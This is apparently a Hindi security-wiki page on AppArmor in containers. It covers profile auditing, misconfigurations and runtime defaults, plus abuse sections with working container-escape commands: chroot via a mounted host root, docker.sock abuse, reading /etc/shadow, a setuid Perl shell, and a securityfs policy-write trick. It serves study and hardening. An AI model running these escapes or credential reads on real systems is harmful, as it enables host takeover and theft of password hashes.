# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## अवलोकन

AppArmor एक **अनिवार्य अभिगम नियंत्रण** प्रणाली है, जो प्रति-प्रोग्राम प्रोफ़ाइल के ज़रिए प्रतिबंध लागू करती है। पारंपरिक DAC जाँचों के विपरीत, जो उपयोगकर्ता और समूह के स्वामित्व पर बहुत अधिक निर्भर करती हैं, AppArmor kernel को प्रक्रिया से जुड़ी नीति लागू करने देता है। Container परिवेशों में यह इसलिए महत्वपूर्ण है, क्योंकि किसी workload के पास कोई कार्रवाई करने की कोशिश करने के लिए पर्याप्त पारंपरिक privilege हो सकता है, फिर भी उसे अस्वीकार किया जा सकता है—क्योंकि उसकी AppArmor प्रोफ़ाइल संबंधित path, mount, network व्यवहार या capability के उपयोग की अनुमति नहीं देती।

सबसे महत्वपूर्ण वैचारिक बात यह है कि AppArmor **path-आधारित** है। यह SELinux की तरह labels के बजाय path नियमों के माध्यम से filesystem access पर विचार करता है। इससे इसे समझना और उपयोग करना आसान व प्रभावी बनता है, लेकिन इसका अर्थ यह भी है कि bind mounts और वैकल्पिक path लेआउट पर सावधानीपूर्वक ध्यान देना चाहिए। यदि host की वही सामग्री किसी दूसरे path के ज़रिए पहुँच योग्य हो जाती है, तो नीति का प्रभाव operator की शुरुआती अपेक्षा से अलग हो सकता है।

## Container आइसोलेशन में भूमिका

Container सुरक्षा समीक्षाएँ अक्सर capabilities और seccomp तक ही सीमित रहती हैं, लेकिन उन जाँचों के बाद भी AppArmor महत्वपूर्ण रहता है। मान लीजिए कि किसी container के पास आवश्यकता से अधिक privilege है, या किसी workload को संचालन संबंधी कारणों से एक अतिरिक्त capability की ज़रूरत थी। AppArmor तब भी file access, mount व्यवहार, networking और execution patterns को इस तरह सीमित कर सकता है कि स्पष्ट दुरुपयोग का रास्ता रुक जाए। इसीलिए, "application को चलाने के लिए" AppArmor को अक्षम करना चुपचाप एक जोखिमपूर्ण configuration को सक्रिय रूप से exploit किए जा सकने वाले configuration में बदल सकता है।

## प्रयोगशाला

Host पर AppArmor सक्रिय है या नहीं, यह जाँचने के लिए उपयोग करें:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

यह देखने के लिए कि वर्तमान container process किसके तहत चल रहा है:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

अंतर से एक महत्वपूर्ण बात समझ आती है। सामान्य स्थिति में, process को runtime द्वारा चुने गए profile से जुड़ा AppArmor context दिखाना चाहिए। unconfined स्थिति में, प्रतिबंध की यह अतिरिक्त परत हट जाती है।

आप यह भी देख सकते हैं कि Docker के अनुसार उसने क्या लागू किया है:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Runtime Usage

Docker, जब host इसका समर्थन करता है, तो डिफ़ॉल्ट या कस्टम AppArmor profile लागू कर सकता है। Podman भी AppArmor-आधारित systems पर AppArmor के साथ integrate हो सकता है, हालांकि SELinux-first distributions पर अक्सर दूसरा MAC system अधिक प्रमुख होता है। Kubernetes उन nodes पर workload स्तर पर AppArmor policy उपलब्ध करा सकता है जो वास्तव में AppArmor का समर्थन करते हैं। LXC और Ubuntu-family के संबंधित system-container environments भी AppArmor का बड़े पैमाने पर उपयोग करते हैं।

व्यावहारिक बात यह है कि AppArmor कोई "Docker feature" नहीं है। यह host-kernel feature है, जिसे कई runtimes लागू कर सकते हैं। अगर host इसका समर्थन नहीं करता या runtime को unconfined चलाने के लिए कहा जाता है, तो कथित सुरक्षा वास्तव में मौजूद नहीं होती।

विशेष रूप से Kubernetes के लिए, आधुनिक API `securityContext.appArmorProfile` है। Kubernetes `v1.30` से पुराने beta AppArmor annotations deprecated हैं। समर्थित hosts पर, `RuntimeDefault` डिफ़ॉल्ट profile है, जबकि `Localhost` उस profile को संदर्भित करता है जो node पर पहले से load होना चाहिए। समीक्षा के दौरान यह बात महत्वपूर्ण है, क्योंकि कोई manifest AppArmor-aware दिख सकता है, लेकिन फिर भी पूरी तरह node-side support और पहले से loaded profiles पर निर्भर हो सकता है।<sup>[[1]](#references)</sup>

एक सूक्ष्म लेकिन उपयोगी operational विवरण यह है कि स्पष्ट रूप से `appArmorProfile.type: RuntimeDefault` सेट करना, field को छोड़ देने से अधिक सख्त है। अगर field स्पष्ट रूप से सेट किया गया है और node AppArmor का समर्थन नहीं करता, तो admission विफल होना चाहिए। अगर field छोड़ दिया गया है, तो workload ऐसे node पर भी चल सकता है जहां AppArmor नहीं है, और उसे सुरक्षा की यह अतिरिक्त परत नहीं मिलेगी। Attacker के नज़रिए से, manifest और node की वास्तविक स्थिति—दोनों की जांच करने का यह एक अच्छा कारण है।<sup>[[1]](#references)</sup>

AppArmor का समर्थन करने वाले Docker hosts पर, सबसे प्रसिद्ध डिफ़ॉल्ट `docker-default` है। यह profile Moby के AppArmor template से generate होता है और यह समझने के लिए महत्वपूर्ण है कि कुछ capability-based PoCs डिफ़ॉल्ट container में फिर भी क्यों विफल होते हैं। मोटे तौर पर, `docker-default` सामान्य networking की अनुमति देता है, `/proc` के बड़े हिस्से में writes को रोकता है, `/sys` के संवेदनशील हिस्सों तक पहुंच को रोकता है, mount operations को block करता है और ptrace को सीमित करता है, ताकि इसका उपयोग host की सामान्य probing के लिए न किया जा सके। इस baseline को समझने से यह अंतर स्पष्ट होता है कि "container के पास `CAP_SYS_ADMIN` है" और "container kernel के उन interfaces पर वास्तव में इस capability का उपयोग कर सकता है जिनकी मुझे परवाह है"।

## Profile Management

AppArmor profiles आमतौर पर `/etc/apparmor.d/` के अंतर्गत रखे जाते हैं। एक सामान्य naming convention में executable path के slashes को dots से बदल दिया जाता है। उदाहरण के लिए, `/usr/bin/man` के लिए profile आमतौर पर `/etc/apparmor.d/usr.bin.man` में रखा जाता है। Defense और assessment—दोनों के दौरान यह विवरण महत्वपूर्ण है, क्योंकि active profile का नाम पता चलने पर आप अक्सर host पर उससे संबंधित file जल्दी ढूंढ सकते हैं।

Host-side management के उपयोगी commands में शामिल हैं:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

कंटेनर-सुरक्षा संदर्भ में ये कमांड महत्वपूर्ण हैं, क्योंकि ये बताते हैं कि प्रोफ़ाइल वास्तव में कैसे बनाई जाती हैं, लोड की जाती हैं, complain mode में बदली जाती हैं और application में बदलाव के बाद संशोधित की जाती हैं। यदि troubleshooting के दौरान किसी operator की प्रोफ़ाइल को complain mode में ले जाने और enforcement बहाल करना भूल जाने की आदत है, तो दस्तावेज़ों में container सुरक्षित दिख सकता है, जबकि वास्तविकता में उसका व्यवहार कहीं अधिक ढीला हो सकता है।

### प्रोफ़ाइल बनाना और अपडेट करना

`aa-genprof` application के व्यवहार का निरीक्षण कर सकता है और इंटरैक्टिव तरीके से प्रोफ़ाइल बनाने में मदद कर सकता है:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` एक टेम्पलेट प्रोफ़ाइल जनरेट कर सकता है, जिसे बाद में `apparmor_parser` से लोड किया जा सकता है:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

जब binary बदलती है और policy को अपडेट करने की आवश्यकता होती है, `aa-logprof` logs में मिले denials को फिर से चला सकता है और operator को उन्हें allow या deny करने का निर्णय लेने में सहायता कर सकता है:

```bash
sudo aa-logprof
```

### लॉग

AppArmor द्वारा अस्वीकृतियाँ अक्सर `auditd`, syslog या `aa-notify` जैसे टूल्स के ज़रिए दिखाई देती हैं:

```bash
sudo aa-notify -s 1 -v
```

यह operational और offensive दोनों उद्देश्यों के लिए उपयोगी है। Defenders इसका उपयोग profiles को बेहतर बनाने के लिए करते हैं। Attackers यह जानने के लिए इसका उपयोग करते हैं कि किस exact path या operation को deny किया जा रहा है और क्या AppArmor वह control है जो exploit chain को रोक रहा है।

### Exact Profile File की पहचान करना

जब कोई runtime किसी container के लिए कोई विशिष्ट AppArmor profile name दिखाता है, तो अक्सर उस name को disk पर मौजूद profile file से जोड़ना उपयोगी होता है:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

यह विशेष रूप से host-side review के दौरान उपयोगी है, क्योंकि यह "container कहता है कि वह `lowpriv` profile के तहत चल रहा है" और "वास्तविक नियम इस विशिष्ट फ़ाइल में हैं, जिसका ऑडिट या reload किया जा सकता है" के बीच का अंतर मिटाता है।

### ऑडिट करने के लिए अहम नियम

जब आप कोई profile पढ़ सकते हों, तो सिर्फ़ साधारण `deny` lines पर न रुकें। कई rule types यह तय करने में अहम भूमिका निभाते हैं कि container escape attempt के विरुद्ध AppArmor कितना उपयोगी होगा:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: target binary को unconfined चलाता है। अगर कोई उपलब्ध helper, shell या interpreter `ux` के तहत अनुमति प्राप्त है, तो आम तौर पर सबसे पहले उसी को जाँचना चाहिए।
- `px` / `Px` और `cx` / `Cx`: exec पर profile transitions करते हैं। ये अपने-आप में बुरे नहीं हैं, लेकिन इनका ऑडिट करना चाहिए, क्योंकि transition आपको मौजूदा profile से कहीं अधिक व्यापक profile में पहुँचा सकता है।
- `change_profile`: किसी task को तुरंत या अगले exec पर किसी अन्य loaded profile में switch करने देता है। अगर destination profile कम सख़्त है, तो यह restrictive domain से बाहर निकलने का इच्छित रास्ता बन सकता है।
- `flags=(complain)`, `flags=(unconfined)` या नए `flags=(prompt)`: इनसे तय होना चाहिए कि आप profile पर कितना भरोसा करें। `complain` denials को लागू करने के बजाय log करता है, `unconfined` सुरक्षा सीमा हटा देता है, और `prompt` केवल kernel-enforced deny के बजाय userspace के निर्णय पर निर्भर करता है।
- `userns` या `userns create,`: नए AppArmor policy user namespaces बनाने की अनुमति को नियंत्रित कर सकते हैं। अगर container profile स्पष्ट रूप से इसकी अनुमति देता है, तो nested user namespaces उपयोग में रह सकते हैं—भले ही platform अपनी hardening strategy के हिस्से के रूप में AppArmor का इस्तेमाल करता हो।

उपयोगी host-side grep:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

इस तरह का ऑडिट अक्सर सैकड़ों सामान्य file rules को घूरने से ज़्यादा उपयोगी होता है। अगर किसी breakout के लिए helper को execute करना, नया namespace दर्ज करना, या कम प्रतिबंधात्मक profile में escape करना ज़रूरी है, तो जवाब अक्सर इन स्पष्ट `deny /etc/shadow r` जैसी पंक्तियों के बजाय transition-oriented rules में छिपा होता है।

## गलत कॉन्फ़िगरेशन

सबसे स्पष्ट गलती `apparmor=unconfined` है। Administrators अक्सर इसे तब सेट करते हैं, जब कोई application इसलिए विफल हो जाती है क्योंकि profile ने किसी खतरनाक या अप्रत्याशित चीज़ को सही ढंग से block किया था। अगर यह flag production में बना रहता है, तो MAC layer प्रभावी रूप से पूरी तरह हटा दी गई है।

एक और सूक्ष्म समस्या यह मानना है कि bind mounts हानिरहित हैं, क्योंकि file permissions सामान्य दिखती हैं। चूँकि AppArmor path-based है, इसलिए host paths को वैकल्पिक mount locations के तहत उपलब्ध कराने से path rules के साथ समस्याएँ हो सकती हैं। तीसरी गलती यह भूलना है कि config file में profile का नाम होने का कोई खास मतलब नहीं है, अगर host kernel वास्तव में AppArmor को enforce नहीं कर रहा है।

## दुरुपयोग

AppArmor हट जाने पर, पहले से प्रतिबंधित operations अचानक काम कर सकते हैं: bind mounts के ज़रिए संवेदनशील paths पढ़ना, procfs या sysfs के उन हिस्सों तक पहुँचना जिनका उपयोग कठिन बना रहना चाहिए था, capabilities/seccomp भी अनुमति दें तो mount-संबंधी actions करना, या ऐसे paths का उपयोग करना जिन्हें profile सामान्यतः deny करता। AppArmor अक्सर यही समझाता है कि capability-आधारित breakout का प्रयास कागज़ पर “काम करना चाहिए” ऐसा लगने के बावजूद व्यवहार में विफल क्यों होता है। AppArmor हटाएँ, और वही प्रयास सफल होने लग सकता है।

अगर आपको संदेह है कि path-traversal, bind-mount, या mount-आधारित abuse chain को रोकने वाली मुख्य चीज़ AppArmor है, तो पहला कदम आमतौर पर यह जाँचना होता है कि profile के साथ और उसके बिना क्या-क्या accessible हो जाता है। उदाहरण के लिए, अगर कोई host path container के अंदर mount किया गया है, तो पहले जाँचें कि क्या आप उसमें आगे जा सकते हैं और उसे पढ़ सकते हैं:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

यदि container में `CAP_SYS_ADMIN` जैसी कोई खतरनाक capability भी है, तो सबसे व्यावहारिक परीक्षणों में से एक यह देखना है कि क्या mount operations या संवेदनशील kernel filesystems तक पहुँच को AppArmor रोक रहा है:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

ऐसे environments में जहाँ bind mount के ज़रिए host path पहले से उपलब्ध हो, AppArmor के निष्क्रिय हो जाने से read-only information-disclosure issue भी सीधे host file access में बदल सकता है:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

इन commands का उद्देश्य यह नहीं है कि केवल AppArmor ही breakout कराता है। बात यह है कि AppArmor हटते ही, filesystem और mount-आधारित abuse के कई रास्तों को तुरंत आज़माया जा सकता है।

### पूरा उदाहरण: AppArmor Disabled + Host Root Mounted

अगर container में host root पहले से ही `/host` पर bind-mounted है, तो AppArmor हटाने से blocked filesystem abuse path पूरी तरह से host escape का रास्ता बन सकता है:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

जब shell host filesystem के ज़रिए execute हो रहा होता है, तब workload प्रभावी रूप से container boundary से escape कर चुका होता है:

```bash
id
hostname
cat /etc/shadow | head
```

### पूरा उदाहरण: AppArmor Disabled + Runtime Socket

अगर असली बाधा runtime state के आसपास AppArmor थी, तो escape के लिए mounted socket ही काफी हो सकता है:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

सटीक path mount point पर निर्भर करता है, लेकिन अंतिम नतीजा एक ही होता है: AppArmor अब runtime API तक पहुँच को नहीं रोकता, और runtime API ऐसा container लॉन्च कर सकता है जो host को compromise कर दे।

### पूर्ण उदाहरण: Path-Based Bind-Mount Bypass

क्योंकि AppArmor path-based है, इसलिए `/proc/**` को सुरक्षित रखने से उसी host procfs content की सुरक्षा अपने-आप नहीं होती, जब वह किसी दूसरे path के ज़रिए उपलब्ध हो:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

प्रभाव इस बात पर निर्भर करता है कि वास्तव में क्या mount किया गया है और क्या alternate path अन्य controls को भी bypass करता है, लेकिन यह pattern सबसे स्पष्ट कारणों में से एक है कि AppArmor का मूल्यांकन mount layout के साथ किया जाना चाहिए, न कि अलग से।

### पूरा उदाहरण: Shebang Bypass

AppArmor, executed script path के साथ profile attach कर सकता है, न कि उसके shebang में बताए गए interpreter के साथ। इसके विपरीत, interpreter को सीधे invoke करने पर उसका profile चुना जा सकता है। एक [AppArmor maintainer इस अंतर का वर्णन करता है](https://bugs.launchpad.net/apparmor/+bug/1911431)। एक ऐतिहासिक उदाहरण में ऐसी script शामिल थी जिसकी पहली पंक्ति एक confined interpreter की ओर इशारा करती है:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

यह उदाहरण केवल एक संभावित स्थिति है, जिसमें interpreter की file capability प्रभावी हो सकती है और script का वास्तविक exec attachment इस operation की अनुमति देता है। Loaded policy और process label, capability bounding set, `no_new_privs`, और mount की `nosuid` स्थिति जाँचें; केवल profile file का नाम या `cap_setuid+ep` की listing यह साबित नहीं करती कि transition संभव है। Interpreter chains और execution के वैकल्पिक रास्तों की अलग से समीक्षा करें।

## Policy-control files को privileged write primitive के रूप में इस्तेमाल करना

प्रभावित AppArmor kernels पर, unprivileged user securityfs की `.load`, `.replace`, या `.remove` file को लिखने के लिए खोल सकता है, लेकिन सीधा `write()` विफल हो जाता है क्योंकि write के समय policy-admin permission जाँची जाती है। यदि setuid helper उस descriptor को stdout या stderr के रूप में विरासत में पाता है और attacker-controlled bytes लिखता है, तो kernel helper की credentials देखता है। इससे helper policy data का *privileged writer* बन जाता है; यह caller को सामान्य रूप से root access देने जैसा नहीं है। Qualys ने दिखाया कि `su -P` अपने privileged PTY path के ज़रिए उसी user के रूप में चलाए गए command से bytes आगे भेज सकता है; इस तरीके के लिए user के account पर password सेट होना ज़रूरी है। World-writable file mode को exposure का प्रमाण मानने के बजाय installed kernel और `su` के fixes जाँचें।<sup>[[3]](#references)[[4]](#references)</sup>

प्रभावित kernel और helper वाले disposable lab में, इससे एक test profile बनाया और फिर हटाया जाता है। Shell हर control file को `su` के उसमें लिखने से पहले खोलता है; `stty raw` PTY relay को compiled profile bytes बदलने से रोकता है। यह test किसी production profile पर न चलाएँ।<sup>[[3]](#references)</sup>

```bash
printf '/usr/bin/true {\n}\n' > /tmp/ht-aa-probe
apparmor_parser -K -o /tmp/ht-aa-probe.pf /tmp/ht-aa-probe
su -P -c 'stty raw && cat /tmp/ht-aa-probe.pf' "$USER" > /sys/kernel/security/apparmor/.load
grep '/usr/bin/true ' /sys/kernel/security/apparmor/profiles
su -P -c 'stty raw && printf %s /usr/bin/true' "$USER" > /sys/kernel/security/apparmor/.remove
```

वही primitive किसी मौजूदा profile को बदल सकता है। उदाहरण के लिए, launcher के लिए `userns` की अनुमति देने वाला profile AppArmor की user-namespace पाबंदी हटा सकता है, लेकिन इससे host-root capabilities नहीं मिलतीं; वास्तविक namespace sysctls और अन्य controls अब भी मायने रखते हैं। यह किसी target process को confinement से बाहर भी कर सकता है। व्यापक privilege-escalation workflow के लिए [kernel exposure checks](../../../main-system-information/kernel-vulnerability-assessment.md) और [Linux Hardening overview](../../../) देखें।<sup>[[3]](#references)[[4]](#references)</sup>

## जांच

इन जांचों का उद्देश्य तीन सवालों के तुरंत जवाब पाना है: क्या host पर AppArmor enabled है, क्या मौजूदा process confined है, और क्या runtime ने वास्तव में इस container पर profile लागू किया है?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

यहाँ क्या दिलचस्प है:

- अगर `/proc/self/attr/current` में `unconfined` दिखता है, तो वर्कलोड को AppArmor confinement का लाभ नहीं मिल रहा है।
- अगर `aa-status` में AppArmor disabled या loaded नहीं दिखता, तो runtime config में दिया गया कोई भी profile name अधिकतर केवल दिखावे के लिए है।
- अगर `docker inspect` में `unconfined` या कोई अप्रत्याशित custom profile दिखता है, तो अक्सर यही वजह होती है कि filesystem या mount-based abuse path काम करता है।
- अगर `/sys/kernel/security/apparmor/profiles` में वह profile मौजूद नहीं है जिसकी आपको उम्मीद थी, तो runtime या orchestrator configuration अपने-आप में पर्याप्त नहीं है।
- अगर किसी कथित रूप से hardened profile में `ux`, व्यापक `change_profile`, `userns`, या `flags=(complain)` जैसी rules हैं, तो वास्तविक security boundary profile name से लगने वाले संकेत से कहीं कमज़ोर हो सकती है।

अगर किसी container को operational reasons से पहले से elevated privileges मिले हुए हैं, तो AppArmor को enabled रखने से controlled exception और कहीं बड़ी security failure के बीच अक्सर फ़र्क पड़ता है।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | AppArmor-सक्षम hosts पर default रूप से enabled | जब तक override न किया जाए, `docker-default` AppArmor profile का उपयोग करता है | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host पर निर्भर | `--security-opt` के ज़रिए AppArmor समर्थित है, लेकिन सटीक default host/runtime पर निर्भर करता है और Docker के documented `docker-default` profile जितना universal नहीं है | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | अगर `appArmorProfile.type` निर्दिष्ट नहीं है, तो default `RuntimeDefault` होता है, लेकिन यह केवल तभी लागू होता है जब node पर AppArmor enabled हो | `securityContext.appArmorProfile.type: Unconfined`, कमज़ोर profile के साथ `securityContext.appArmorProfile.type: Localhost`, AppArmor support के बिना nodes |
| containerd / CRI-O under Kubernetes | Node/runtime support पर निर्भर | Kubernetes द्वारा समर्थित आम runtimes AppArmor को support करते हैं, लेकिन वास्तविक enforcement अब भी node support और workload settings पर निर्भर करता है | Kubernetes वाली row जैसा ही; direct runtime configuration AppArmor को पूरी तरह skip भी कर सकता है |

AppArmor के लिए, सबसे महत्वपूर्ण variable अक्सर **host** होता है, केवल runtime नहीं। Manifest में profile setting से उस node पर confinement लागू नहीं होता जहाँ AppArmor enabled नहीं है। 



## References

- [1] [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [Qualys CrackArmor technical advisory](https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt)
- [4] [Ubuntu CrackArmor vulnerability knowledge base](https://ubuntu.com/security/vulnerabilities/crackarmor)
{{#include ../../../../banners/hacktricks-training.md}}
